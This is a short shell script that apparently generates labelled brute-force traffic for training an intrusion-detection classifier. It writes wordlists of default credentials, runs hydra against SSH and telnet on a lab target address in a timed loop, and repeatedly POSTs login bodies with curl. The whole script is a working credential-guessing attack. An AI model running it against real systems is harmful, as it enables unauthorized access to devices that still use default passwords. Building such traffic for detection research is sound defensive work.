#!/bin/sh
# bruteforce_attack.sh  ->  intended model class: "Bruteforce"
#
# Needs forward data bursts (credential payloads) so Fwd bulk populates, in many
# short completed login flows (dataset: 6/7 pkts, ACK-heavy, Pkt Len ~77,
# Fwd Byts/b Avg ~13). hydra against the victim's live services sends real
# usernames/passwords forward and completes handshakes -> ACKs + fwd payload.
# We also drive repeated authenticated-style HTTP POSTs of small credential
# bodies to guarantee a forward burst even if a service answers tersely.

echo "[BRUTEFORCE] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

rnd() { awk "BEGIN{srand();print int(rand()*$1)+1}"; }

case "$INTENSITY" in
    low)    THREADS=2; SLEEP_MAX=5 ;;
    high)   THREADS=8; SLEEP_MAX=1 ;;
    *)      THREADS=4; SLEEP_MAX=3 ;;  # medium
esac

cat > /tmp/bf_users.txt <<'UEOF'
admin
root
user
test
pi
device
UEOF
cat > /tmp/bf_passwords.txt <<'PEOF'
admin
password
1234
guest
root
raspberry
toor
default
letmein
123456
PEOF

# A small credential-style body so each HTTP attempt carries a forward payload.
printf 'username=admin&password=admin123&login=Login&csrf=0123456789abcdef\n' > /tmp/bf_body.txt

while [ "$(date +%s)" -lt "$END" ]; do
    hydra -L /tmp/bf_users.txt -P /tmp/bf_passwords.txt -t "$THREADS" -q "$TARGET" ssh 2>/dev/null
    hydra -L /tmp/bf_users.txt -P /tmp/bf_passwords.txt -t "$THREADS" -q "$TARGET" telnet 2>/dev/null
    # Repeated POST login attempts -> forward credential payload bursts on :80
    k=0
    while [ "$k" -lt 8 ]; do
        curl -s -o /dev/null -m 5 -X POST --data-binary @/tmp/bf_body.txt \
            "http://$TARGET/login" 2>/dev/null
        k=$((k + 1))
    done
    sleep "$(rnd "$SLEEP_MAX")"
done
echo "[BRUTEFORCE] Done."
